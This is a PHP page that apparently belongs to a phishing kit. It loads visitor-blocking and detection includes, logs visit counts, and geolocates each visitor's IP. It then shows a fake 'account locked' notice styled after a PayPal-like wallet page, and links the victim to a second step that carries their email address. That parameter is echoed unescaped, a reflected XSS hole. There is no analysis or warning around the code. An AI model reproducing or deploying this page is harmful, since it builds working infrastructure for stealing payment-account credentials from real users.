<?php

include('../blocker.php');
include('../detect.php'); 
include('../pais/contenttrans.php');
$datei = fopen("../logsz/login.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../logsz/login.txt","w");
fwrite($datei, $count);
fclose($datei);
?>
<?php include('header.php'); ?> 
<?= $p1 ?>
<p>- <?= $q1 ?></p>
<p>- <?= $r1 ?> <?php
$ip = $_SERVER['REMOTE_ADDR'];$GLOBALS_LOCATION=$GLOBAL.'l';
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip.""));
$country = $details->geoplugin_countryCode;
$region = $details->geoplugin_countryName;
$kode_negara = strtolower($negara);
echo " ".$region." ".$country."";
?>, <?php
$dt = date(" F j Y ");
$msg = " ".$dt." ";
echo " ".$dt." ";
?></p>
<p>- <?= $s1 ?> <?= date('F j Y',strtotime("-1 days"));?> (<?= $t1 ?>)</p>
<p>- <?= $u1 ?></p>
<p>- <?= $v1 ?></p>
<div class="footerLink">
	<a href="websrc.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=two&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>" data-pagename="main:walletweb:home:FIModule:walletPage" data-pagename2="main:walletweb:home:FIModule:walletPage:::" class="vx_btn vx_btn-secondary vx_btn-medium fiModule-footer_setMargin nemo_linkCard"> <?= $w1 ?>
	</a>
</div>
<?php include('footer.php'); ?> 